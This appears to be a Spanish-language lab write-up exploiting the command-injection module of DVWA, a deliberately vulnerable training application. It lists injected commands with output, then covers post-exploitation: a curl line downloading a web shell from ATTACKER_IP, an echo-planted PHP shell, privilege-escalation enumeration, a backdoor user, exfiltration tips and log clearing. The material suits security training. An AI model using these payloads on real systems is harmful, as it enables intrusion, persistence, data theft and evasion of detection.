# DVWA - Command Execution (RCE)

## 📌 Descripción
La vulnerabilidad de **Command Execution** (también conocida como *Remote Code Execution*, RCE) permite inyectar comandos del sistema operativo en una aplicación web vulnerable.  
Esto ocurre cuando los datos introducidos por el usuario se pasan directamente a funciones del sistema sin validación o filtrado.

En DVWA, esta vulnerabilidad se encuentra en el módulo `Command Execution` y permite ejecutar comandos en el sistema operativo donde se aloja la aplicación.

---

## 🎯 Objetivo
Ejecutar comandos arbitrarios en el servidor web vulnerable y demostrar acceso a información del sistema.

---

## ⚙️ Herramientas utilizadas
- **Kali Linux** (entorno atacante)
- **DVWA** (entorno víctima)
- **Burp Suite** (opcional, para interceptar y modificar peticiones HTTP)
- **bash** y utilidades de Linux (`ls`, `cat`, `whoami`, `uname`, etc.)

---

## 📍 Paso 1 - Acceso al módulo
1. Iniciar sesión en DVWA con un usuario válido.
2. Ir a la sección **Command Execution**.
3. Confirmar que el nivel de seguridad de DVWA esté en **LOW** para comenzar.

---

## 📍 Paso 2 - Prueba inicial de inyección

1. Introducir en el campo de la IP un valor legítimo, como:

127.0.0.1

Esto debería devolver un `ping` al localhost.

<img width="656" height="254" alt="imagen" src="https://github.com/user-attachments/assets/514fdbfc-5675-447f-b39a-35f00a512c83" />

2. Modificar la entrada para inyectar un segundo comando usando `;`:

127.0.0.1; whoami

Esto ejecuta `ping` y después `whoami` en el servidor.

<img width="657" height="276" alt="imagen" src="https://github.com/user-attachments/assets/8fb69082-69e9-442f-9da0-de4254ab4f28" />

---

## 📍 Paso 3 - Enumeración del sistema

Ejemplos de comandos útiles:

127.0.0.1; uname -a # Información del sistema

<img width="899" height="268" alt="imagen" src="https://github.com/user-attachments/assets/0d15d2cd-c11a-485f-a386-fe7e5f5bcb97" />


127.0.0.1; id # Información de usuario

<img width="503" height="263" alt="imagen" src="https://github.com/user-attachments/assets/064ae37f-461b-4f48-b7b8-5c6f5ebc20b1" />


127.0.0.1; ls -la /var/www/html

<img width="506" height="357" alt="imagen" src="https://github.com/user-attachments/assets/3a6da1d9-af82-4c64-857d-bc71af379899" />


127.0.0.1; cat /etc/passwd

<img width="669" height="561" alt="imagen" src="https://github.com/user-attachments/assets/7b81b725-1684-4783-be68-36f3b40ae3a2" />


---

## 📍 Paso 4 - Evidencias

📂 **Salida de `whoami`:**

www-data


📂 **Salida de `uname -a`:**

Linux debian 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64 GNU/Linux


📂 **Archivos en `/var/www/html`:**

index.php
dvwa/


---

## 📍 Paso 5 - Posibles pasos siguientes

- Intentar subir un webshell (*php reverse shell*).
- Intentar escalar privilegios desde el usuario web (`www-data`).
- Persistencia y exfiltración de datos.

## 🐚 1. Subir una webshell

Una vez que puedes ejecutar comandos, puedes intentar subir una webshell para tener una interfaz más cómoda y persistente.

### 🔸 Ejemplo: PHP reverse shell

```Bash
127.0.0.1; curl http://ATTACKER_IP/shell.php -o /var/www/html/shell.php
```

- Prepara el archivo shell.php en tu máquina atacante (Kali) con un servidor HTTP:

```Bash
python3 -m http.server 80
```

- Luego accede a http://victima/shell.php para ejecutar la shell.

### 🔸 Alternativa: Usar echo para crear la shell

```bash
127.0.0.1; echo "<?php system($_GET['cmd']); ?>" > /var/www/html/cmd.php
```

Accede a: http://127.0.0.1/cmd.php?cmd=id

---

## 📈 2. Escalada de privilegios

Ya que estás como www-data, puedes intentar escalar privilegios:

### 🔍 Enumerar el sistema

```bash
127.0.0.1; sudo -l
```

```bash
127.0.0.1; find / -perm -4000 2>/dev/null
```

Resultado:


<img width="544" height="412" alt="imagen" src="https://github.com/user-attachments/assets/80c1449e-40ff-44ee-836a-2fab96e2a029" />


```bash
127.0.0.1; cat /etc/sudoers
```

### 🧪 Buscar exploits locales

- Usa herramientas como linpeas.sh o linux-exploit-suggester.sh
- Descárgalas con wget o curl desde tu máquina atacante

## 🔄 3. Persistencia

Una vez dentro, puedes crear un usuario o añadir tu clave SSH:

```Bash
127.0.0.1; useradd pentester -m -s /bin/bash
127.0.0.1; echo 'pentester:1234' | chpasswd
```

O añadir tu clave pública a ~/.ssh/authorized_keys si tienes acceso.

## 📤 4. Exfiltración de datos

Busca archivos sensibles:

```bash
127.0.0.1; cat /etc/passwd
127.0.0.1; ls -la /home/
127.0.0.1; find /var/www -type f
```

Sube los datos a tu máquina con curl, nc, o incluso scp si tienes SSH.

## 🧠 5. Limpieza y huellas

Antes de terminar, considera limpiar tus rastros:

```bash
127.0.0.1; rm /var/www/html/shell.php
127.0.0.1; history -c
```

## 📚 Recursos para seguir aprendiendo

- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [GTFOBins](https://gtfobins.github.io/) - Para escalada de privilegios
- [Pentestmonkey Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) 
